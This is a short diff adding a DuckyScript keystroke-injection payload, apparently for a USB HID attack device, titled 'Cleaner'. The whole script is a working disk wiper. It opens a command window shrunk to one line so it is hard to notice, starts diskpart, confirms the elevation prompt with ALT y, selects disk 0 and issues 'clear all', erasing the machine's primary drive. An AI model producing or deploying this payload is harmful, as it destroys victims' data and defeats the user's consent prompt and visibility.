@@ -1,0 +1,23 @@
+REM Name: Cleaner
+REM Author: KosteQ314
+REM Descriptiom: Will delete anything located on the C: drive
+
+DELAY 1000
+GUI r
+STRING cmd /k mode con: cols=15 lines=1
+DELAY 100
+ENTER
+DELAY 300
+STRING diskpart
+DELAY 100
+ENTER
+DELAY 500
+ALT y
+DELAY 500
+STRING select disk 0
+DELAY 100
+ENTER
+DELAY 100
+STRING clear all
+DELAY 100
+ENTER
